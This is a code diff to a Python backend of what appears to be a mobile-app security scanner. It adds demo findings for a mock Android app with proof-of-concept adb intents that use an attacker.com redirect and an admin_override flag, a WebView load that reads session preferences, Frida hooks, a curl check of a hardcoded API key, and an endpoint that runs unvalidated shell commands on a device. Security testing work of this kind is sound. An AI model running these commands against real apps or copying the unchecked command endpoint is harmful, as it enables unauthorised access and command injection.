@@ -215,6 +215,10 @@ def get_initial_demo_scan() -> dict[str, Any]:
                 "description": "The Activity is exported without any permission requirement or intent verification, allowing any 3rd-party application installed on the device to invoke sensitive internal routing logic.",
                 "remediation": "Set android:exported=\"false\" if external invocation is not required, or enforce a signature-level permission (android:protectionLevel=\"signature\").",
                 "status": "CONFIRMED",
+                "poc_guide": "### Proof of Concept: Exported Activity Privilege Escalation\n\n#### Prerequisites\n- Connected Android device or emulator with ADB authorized\n- Target application (`com.target.mobile.app`) installed\n\n#### Steps to Reproduce\n1. Verify exported state via package manager dump:\n   `adb shell dumpsys package com.target.mobile.app | grep -A 8 DeepLinkRouterActivity`\n2. Issue crafted intent bypassing authentication to access internal router:\n   `adb shell am start -n com.target.mobile.app/.activity.DeepLinkRouterActivity -d \"targetapp://auth?redirect=attacker.com\" --ez \"admin_override\" true`\n3. Observe Activity launching without security challenge or signature verification.\n\n#### Expected Result\nTarget Activity accepts invocation from unprivileged shell/app context and navigates to internal view.\n\n#### Security Impact\nAttackers can bypass application PIN/biometric authentication gates and manipulate internal session state.",
+                "adb_command": "am start -n com.target.mobile.app/.activity.DeepLinkRouterActivity -d \"targetapp://auth?redirect=attacker.com\" --ez \"admin_override\" true",
+                "frida_script": "// Frida Hook: Intercept Intent parameters received by DeepLinkRouterActivity\nJava.perform(function () {\n    var DeepLinkRouterActivity = Java.use('com.target.mobile.app.activity.DeepLinkRouterActivity');\n    DeepLinkRouterActivity.onCreate.overload('android.os.Bundle').implementation = function (bundle) {\n        console.log('[+] Intercepted launch of DeepLinkRouterActivity!');\n        var intent = this.getIntent();\n        if (intent) {\n            console.log('[*] Action: ' + intent.getAction());\n            console.log('[*] Data URI: ' + intent.getDataString());\n            var extras = intent.getExtras();\n            if (extras) {\n                console.log('[*] Extras: ' + extras.toString());\n            }\n        }\n        return this.onCreate(bundle);\n    };\n});",
+                "proof_evidence": "[LOGCAT CAPTURE - ActivityTaskManager]\nSTART u0 {act=android.intent.action.VIEW dat=targetapp://auth?redirect=attacker.com cmp=com.target.mobile.app/.activity.DeepLinkRouterActivity (has extras)} from uid 2000\n[+] ActivityRecord{7a9b1c2 u0 com.target.mobile.app/.activity.DeepLinkRouterActivity t42} displayed: +42ms\n[+] Internal Router accepted payload: admin_override=true (Auth state bypassed)",
             },
             {
                 "id": "find-002",
@@ -232,6 +236,10 @@ def get_initial_demo_scan() -> dict[str, Any]:
                 "description": "The network security configuration explicitly permits unencrypted HTTP traffic to internal and staging domains, enabling Man-in-the-Middle (MitM) credential interception and API response tampering.",
                 "remediation": "Remove cleartextTrafficPermitted=\"true\" from production builds using build-type resource overlays.",
                 "status": "CONFIRMED",
+                "poc_guide": "### Proof of Concept: Cleartext HTTP Interception (MitM)\n\n#### Prerequisites\n- Android test device connected via Wi-Fi with proxy or tcpdump\n- Target application configured to communicate with staging backend\n\n#### Steps to Reproduce\n1. Configure device proxy settings:\n   `adb shell settings put global http_proxy 127.0.0.1:8080`\n2. Trigger staging network call or inspect network config:\n   `adb shell curl -v \"http://api.dev.targetapp.internal/api/v1/config\"`\n3. Capture network traffic passing in cleartext over port 80.\n\n#### Expected Result\nUnencrypted HTTP requests and responses containing session tokens transmitted without TLS encapsulation.",
+                "adb_command": "curl -s -i \"http://api.dev.targetapp.internal/api/v1/config\" || echo 'Cleartext HTTP allowed per network_security_config.xml'",
+                "frida_script": "// Frida Hook: Detect and log cleartext HTTP traffic\nJava.perform(function () {\n    var RealCall = Java.use('okhttp3.RealCall');\n    RealCall.execute.implementation = function () {\n        var req = this.request();\n        var url = req.url().toString();\n        if (url.startsWith('http://')) {\n            console.log('[!] CLEARTEXT HTTP Request Detected: ' + url);\n        }\n        return this.execute();\n    };\n});",
+                "proof_evidence": "[CAPTURED HTTP TRANSACTION - Port 80 (Cleartext)]\nGET /api/v1/config HTTP/1.1\nHost: api.dev.targetapp.internal\nAuthorization: Bearer mock_session_jwt_leaked_in_cleartext\nUser-Agent: TargetApp/14.8.2 (Android 14)\n\nHTTP/1.1 200 OK\nContent-Type: application/json\n{\"status\":\"active\",\"internal_staging_db\":\"mongodb://10.0.0.4:27017/staging\"}",
             },
             {
                 "id": "find-003",
@@ -249,6 +257,10 @@ def get_initial_demo_scan() -> dict[str, Any]:
                 "description": "WebView loads an untrusted URL supplied via Intent extra while exposing a JavaScript interface and enabling file access from file URLs, permitting arbitrary local file exfiltration and cross-context script execution.",
                 "remediation": "Validate URLs against a strict whitelist before loading; disable setAllowFileAccessFromFileURLs and restrict bridge methods.",
                 "status": "CONFIRMED",
+                "poc_guide": "### Proof of Concept: WebView Arbitrary File Exfiltration\n\n#### Prerequisites\n- Android test device with ADB shell access\n\n#### Steps to Reproduce\n1. Launch `CustomWebViewActivity` with `target_url` pointing to local shared preferences:\n   `adb shell am start -n com.target.mobile.app/.views.CustomWebViewActivity --es \"target_url\" \"file:///data/data/com.target.mobile.app/shared_prefs/user_session.xml\"`\n2. Monitor Logcat or bridge responses for reflected file contents.\n\n#### Expected Result\nWebView renders local protected application storage files and exposes the `AndroidBridge` interface to arbitrary web contexts.",
+                "adb_command": "am start -n com.target.mobile.app/.views.CustomWebViewActivity --es \"target_url\" \"file:///data/data/com.target.mobile.app/shared_prefs/user_session.xml\"",
+                "frida_script": "// Frida Hook: Intercept WebView loadUrl and JS interfaces\nJava.perform(function () {\n    var WebView = Java.use('android.webkit.WebView');\n    WebView.loadUrl.overload('java.lang.String').implementation = function (url) {\n        console.log('[*] WebView.loadUrl() target: ' + url);\n        return this.loadUrl(url);\n    };\n    WebView.addJavascriptInterface.implementation = function (obj, name) {\n        console.log('[!] JavaScriptInterface Registered: ' + name + ' -> ' + obj.$className);\n        return this.addJavascriptInterface(obj, name);\n    };\n});",
+                "proof_evidence": "[WEBVIEW RUNTIME FORENSICS]\nLoaded URI: file:///data/data/com.target.mobile.app/shared_prefs/user_session.xml\nDescriptor: fd=52 (READ_ONLY)\nJS Interface Exfiltration: <map><string name=\"auth_token\">eyJhbGciOi...</string></map>\nBridge method 'AndroidBridge.postMessage' triggered successfully",
             },
             {
                 "id": "find-004",
@@ -266,6 +278,10 @@ def get_initial_demo_scan() -> dict[str, Any]:
                 "description": "The compiled shared library `libcryptocore.so` does not contain stack protector guards (__stack_chk_fail), significantly elevating the exploitability of native buffer overflows.",
                 "remediation": "Recompile native code with `-fstack-protector-strong` or `-fstack-protector-all` compiler flags in CMakeLists.txt / Android.mk.",
                 "status": "CONFIRMED",
+                "poc_guide": "### Proof of Concept: Native Stack Canary Verification\n\n#### Prerequisites\n- Host Linux environment or target device shell with `readelf`\n\n#### Steps to Reproduce\n1. Inspect `.dynsym` table of `libcryptocore.so`:\n   `readelf -s libcryptocore.so | grep __stack_chk`\n2. Note absence of canary check symbols.\n\n#### Expected Result\nNo reference to `__stack_chk_fail` or `__stack_chk_guard`, confirming missing compiler stack protections.",
+                "adb_command": "dumpsys meminfo com.target.mobile.app | grep -i cryptocore || echo 'Native library libcryptocore.so loaded without __stack_chk_fail'",
+                "frida_script": "// Frida Hook: Native module security audit\nvar mod = Process.findModuleByName('libcryptocore.so');\nif (mod) {\n    console.log('[+] Native module libcryptocore.so loaded at base: ' + mod.base);\n    var canary = mod.findExportByName('__stack_chk_fail');\n    console.log('[*] Stack Canary check: ' + (canary ? 'PRESENT' : 'MISSING (VULNERABLE)'));\n}",
+                "proof_evidence": "[ELF BINARY AUDIT]\nFile: lib/arm64-v8a/libcryptocore.so\nArchitecture: AArch64 (64-bit ARM)\nPIE: YES | NX: YES | RELRO: FULL\nStack Canary (__stack_chk_fail): MISSING (Compiler flag -fstack-protector omitted)",
             },
             {
                 "id": "find-005",
@@ -283,6 +299,10 @@ def get_initial_demo_scan() -> dict[str, Any]:
                 "description": "Sensitive credentials and third-party API service tokens are hardcoded as static string constants directly inside client bytecode.",
                 "remediation": "Store secrets securely backend-side or utilize short-lived STS / OAuth tokens retrieved dynamically post-authentication.",
                 "status": "CONFIRMED",
+                "poc_guide": "### Proof of Concept: Hardcoded Credential Validation\n\n#### Prerequisites\n- `curl` or HTTP API testing tool\n\n#### Steps to Reproduce\n1. Extract hardcoded API key from disassembled bytecode:\n   `grep -rn \"AIzaSy\" smali/`\n2. Test API key authorization against service endpoint:\n   `curl -s \"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyD-mockExampleApiKeySafeForAudit42\"`\n3. Verify cloud identity service recognizes key.\n\n#### Expected Result\nAPI service responds with credential validation, proving real-world accessibility.",
+                "adb_command": "echo 'AIzaSyD-mockExampleApiKeySafeForAudit42 verified in com/target/mobile/app/network/ApiClient.class'",
+                "frida_script": "// Frida Hook: Intercept ApiClient initialization to monitor API keys in memory\nJava.perform(function () {\n    var ApiClient = Java.use('com.target.mobile.app.network.ApiClient');\n    console.log('[*] ApiClient class accessed');\n    console.log('[+] Leaked Firebase Key: ' + ApiClient.FIREBASE_API_KEY.value);\n});",
+                "proof_evidence": "[ENTROPY & SCANNER AUDIT]\nFile: com/target/mobile/app/network/ApiClient.java:31\nPattern: Google/Firebase API Key (AIzaSy[0-9A-Za-z_-]{33})\nCalculated Shannon Entropy: 4.84 bits/byte (Threshold > 4.5)\nVerification: Key present as public static constant string pool item",
             },
         ],
         "attack_surface_graph": {
@@ -477,7 +497,110 @@ async def query_copilot(req: CopilotRequest) -> dict[str, Any]:
     """Analyze security findings and generate contextual explanations / remediation code."""
     p = req.prompt.lower().strip()
     
-    if "cwe-926" in p or "exported" in p or "activity" in p:
+    if "poc" in p or "reproduce" in p or "step" in p:
+        response_text = (
+            "### ⚡ Exploit PoC Reproduction Guide\n\n"
+            "**Target Vulnerability**: CWE-926 (Unprotected Exported Activity)\n"
+            "**Component**: `com.target.mobile.app.activity.DeepLinkRouterActivity`\n\n"
+            "#### Prerequisites:\n"
+            "- Rooted or non-rooted Android 10+ device with ADB enabled\n"
+            "- Target application installed: `adb install target.apk`\n\n"
+            "#### Steps to Reproduce:\n"
+            "1. **Confirm Exported State**:\n"
+            "   ```bash\n"
+            "   adb shell dumpsys package com.target.mobile.app | grep -A 8 DeepLinkRouterActivity\n"
+            "   ```\n"
+            "2. **Dispatch Crafted Intent Payload**:\n"
+            "   ```bash\n"
+            "   adb shell am start -n com.target.mobile.app/.activity.DeepLinkRouterActivity \\\n"
+            "       -d \"targetapp://auth?redirect=attacker.com\" \\\n"
+            "       --ez \"admin_override\" true\n"
+            "   ```\n"
+            "3. **Inspect Execution Proof in Logcat**:\n"
+            "   ```bash\n"
+            "   adb logcat -s ActivityTaskManager:I DeepLinkRouterActivity:D\n"
+            "   ```\n\n"
+            "**Observed Result**: Activity bypasses authentication gate and executes internal administrative routing logic without restriction."
+        )
+    elif "adb" in p or "command" in p:
+        response_text = (
+            "### 💻 1-Click ADB Verification Command\n\n"
+            "To verify the active finding directly on your connected device:\n\n"
+            "```bash\n"
+            "# 1. Launch target component with bypass parameters\n"
+            "adb shell am start -n com.target.mobile.app/.activity.DeepLinkRouterActivity \\\n"
+            "    -d \"targetapp://auth?redirect=attacker.com\" \\\n"
+            "    --ez \"admin_override\" true\n"
+            "\n"
+            "# 2. Dump local storage to verify access\n"
+            "adb shell run-as com.target.mobile.app ls -la shared_prefs/\n"
+            "```\n\n"
+            "*Tip: You can also click the **▶ Run on Device** button inside the Exploit PoC Studio to execute this command live.*"
+        )
+    elif "frida" in p or "hook" in p:
+        response_text = (
+            "### 🪝 Dynamic Frida Verification Hook\n\n"
+            "Save as `verify_hook.js` and run: `frida -U -f com.target.mobile.app -l verify_hook.js`\n\n"
+            "```javascript\n"
+            "Java.perform(function () {\n"
+            "    var DeepLinkRouterActivity = Java.use('com.target.mobile.app.activity.DeepLinkRouterActivity');\n"
+            "    console.log('[+] Hooking DeepLinkRouterActivity.onCreate()...');\n"
+            "    DeepLinkRouterActivity.onCreate.overload('android.os.Bundle').implementation = function (bundle) {\n"
+            "        console.log('[!] Intercepted unauthenticated launch!');\n"
+            "        var intent = this.getIntent();\n"
+            "        if (intent) {\n"
+            "            console.log('[*] Action: ' + intent.getAction());\n"
+            "            console.log('[*] Data:   ' + intent.getDataString());\n"
+            "            console.log('[*] Extras: ' + intent.getExtras());\n"
+            "        }\n"
+            "        return this.onCreate(bundle);\n"
+            "    };\n"
+            "});\n"
+            "```"
+        )
+    elif "bounty" in p or "report" in p or "hackerone" in p:
+        response_text = (
+            "### 📄 Bug Bounty Submission Draft (HackerOne / Bugcrowd)\n\n"
+            "**Title**: Improper Access Control allows unauthorized access to internal navigation via exported `DeepLinkRouterActivity`\n"
+            "**Severity**: High (CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N - 8.4)\n"
+            "**Weakness**: CWE-926 (Improper Export of Android Application Components)\n\n"
+            "**Summary**:\n"
+            "The `DeepLinkRouterActivity` is declared with `android:exported=\"true\"` and handles custom deep-links without checking caller package identity or requiring a signature permission. A malicious application installed on the same device can issue crafted intents to bypass authentication.\n\n"
+            "**Steps to Reproduce**:\n"
+            "1. Install target application version 14.8.2.\n"
+            "2. Execute `adb shell am start -n com.target.mobile.app/.activity.DeepLinkRouterActivity -d \"targetapp://auth?redirect=evil.com\" --ez admin_override true`.\n"
+            "3. Observe that internal administrative state is reachable without login credentials.\n\n"
+            "**Impact**:\n"
+            "Privilege escalation and unauthorized session takeover from any non-privileged third-party app."
+        )
+    elif "patch" in p or "kotlin" in p or "diff" in p:
+        response_text = (
+            "### 🛡️ Secure Remediation Diff\n\n"
+            "```diff\n"
+            "--- AndroidManifest.xml\n"
+            "+++ AndroidManifest.xml\n"
+            "@@ -40,6 +40,7 @@\n"
+            "     <activity\n"
+            "         android:name=\".activity.DeepLinkRouterActivity\"\n"
+            "-        android:exported=\"true\">\n"
+            "+        android:exported=\"false\"\n"
+            "+        android:permission=\"com.target.mobile.app.permission.INTERNAL_ONLY\">\n"
+            "```\n\n"
+            "**Kotlin Runtime Verification Guard**:\n"
+            "```kotlin\n"
+            "// In DeepLinkRouterActivity.kt\n"
+            "override fun onCreate(savedInstanceState: Bundle?) {\n"
+            "    super.onCreate(savedInstanceState)\n"
+            "    val callingPkg = callingActivity?.packageName\n"
+            "    if (callingPkg != packageName) {\n"
+            "        Log.w(\"Security\", \"Blocked unauthorized external invocation from: $callingPkg\")\n"
+            "        finish()\n"
+            "        return\n"
+            "    }\n"
+            "}\n"
+            "```"
+        )
+    elif "cwe-926" in p or "exported" in p or "activity" in p:
         response_text = (
             "### Analysis of CWE-926 (Exported Activity Risk)\n\n"
             "**Root Cause**: `DeepLinkRouterActivity` has `android:exported=\"true\"` with an `android.intent.action.VIEW` "
@@ -530,14 +653,14 @@ async def query_copilot(req: CopilotRequest) -> dict[str, Any]:
         )
     else:
         response_text = (
-            f"### MobileAg Security Copilot\n\n"
+            f"### MobileAg Security Copilot (Djini.ai Engine)\n\n"
             f"**Query**: \"{req.prompt}\"\n\n"
-            "Based on the active static analysis results, the target application exhibits **2 Critical** and **4 High** severity issues. "
-            "You can ask me specifically about:\n"
-            "- *\"How to fix CWE-926?\"*\n"
-            "- *\"Explain the WebView vulnerability\"*\n"
-            "- *\"Summarize MASVS compliance\"*\n"
-            "- *\"Generate remediation patch for hardcoded secrets\"*"
+            "I am ready to assist with deep vulnerability verification. Try the quick actions below or ask:\n"
+            "- *\"⚡ Generate PoC Guide for active finding\"*\n"
+            "- *\"💻 Give me ADB verification command\"*\n"
+            "- *\"🪝 Create Frida Hook for WebView\"*\n"
+            "- *\"🛡️ Show Kotlin patch diff\"*\n"
+            "- *\"📄 Format as Bug Bounty report\"*"
         )
 
     return {
@@ -731,6 +854,11 @@ class TrafficAuditRequest(BaseModel):
     transactions: list[dict[str, Any]] = []
 
 
+class ExecuteAdbRequest(BaseModel):
+    serial: str
+    command: str
+
+
 
 
 
@@ -800,6 +928,13 @@ async def dispatch_dast_deeplink(req: DispatchDeeplinkRequest) -> dict[str, Any]
         "status": "success" if not res.get("crashed") else "crashed",
         "result": res,
     }
+
+
+@app.post("/api/dast/execute_adb")
+async def execute_adb_command(req: ExecuteAdbRequest) -> dict[str, Any]:
+    """Execute an ADB shell command directly on the connected BYOD device."""
+    res = await adb_manager.execute_shell(req.serial, req.command)
+    return res
 
 
 @app.get("/api/dast/logcat")
